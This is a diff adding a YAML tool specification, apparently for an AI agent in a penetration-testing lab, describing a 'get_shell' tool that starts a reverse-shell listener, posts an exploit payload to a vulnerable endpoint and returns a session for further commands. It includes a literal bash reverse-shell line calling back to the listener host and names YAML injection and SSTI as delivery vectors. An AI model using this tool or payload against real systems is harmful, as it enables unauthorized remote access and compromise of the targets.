@@ -1,0 +1,41 @@
+name: get_shell
+description: >
+  Atomically start a reverse-shell listener, deliver an HTTP exploit payload, and
+  wait for the target to call back. Returns a session_id for subsequent run_cmd calls.
+  The listener starts BEFORE the exploit fires to avoid a race condition.
+side_effect: touches_target
+parameters:
+  lhost:
+    type: string
+    description: >
+      IP address the target will call back to — typically the harness machine's VPN
+      interface (tun0) address (e.g. "10.10.14.5").
+  lport:
+    type: integer
+    description: Port to listen on (e.g. 4444). Must be free on the harness machine.
+  exploit_url:
+    type: string
+    description: URL of the vulnerable endpoint that will be POST-ed to deliver the payload.
+  exploit_body:
+    type: string
+    description: >
+      POST body containing the reverse shell payload. For a bash reverse shell embed:
+      bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
+      The exact format depends on the vulnerability (YAML injection, SSTI, etc.).
+  exploit_headers:
+    type: object
+    description: >
+      Optional HTTP headers for the exploit POST
+      (e.g. Content-Type for the payload format).
+    required: false
+  timeout:
+    type: integer
+    description: Seconds to wait for the reverse shell callback. Default 30.
+    required: false
+returns: >
+  Object with `session_id` (string — pass to run_cmd) and `connected` (bool).
+  On failure: `error` string describing what went wrong.
+notes: >
+  Requires pwntools: pip install pwntools. The exploit POST is sent in a background
+  thread so it doesn't race the listener. Connection resets from the target are
+  expected and suppressed.
